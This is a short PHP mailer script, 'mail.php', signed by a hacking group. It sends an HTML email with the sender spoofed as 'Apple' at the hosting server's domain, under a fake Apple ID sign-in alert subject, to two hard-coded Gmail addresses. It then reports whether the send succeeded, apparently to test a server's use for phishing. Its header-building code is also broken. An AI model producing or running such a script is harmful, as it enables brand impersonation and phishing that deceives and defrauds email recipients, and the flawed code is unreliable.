<body bgcolor="black"> 
<?php 
/* made by Raymond7 */ 
/* Garuda Security Hacker ! */ 
/* mail.php */ 
$name = "Apple"; $to = "sultanpierr0t.1337@gmail.com,penjagasurga404@gmail.com"; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
$body = ' 
<a href="https://wikipedia.org/">Tested Mail 1</a> 
<br> 
<a href="https://wikipedia.org/">Tested Mail 2</a> Kids Was Here '; 
$email = "Apple@$web"; 
$headers = 'From: ' .
$email . "\r\n". 
$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name)) 
{ echo("<font color=lime>Email Sended To => $to </font>"); 
} else 
{ 
echo("<font color=red>Not Support For Mailer</font>"); } ?>
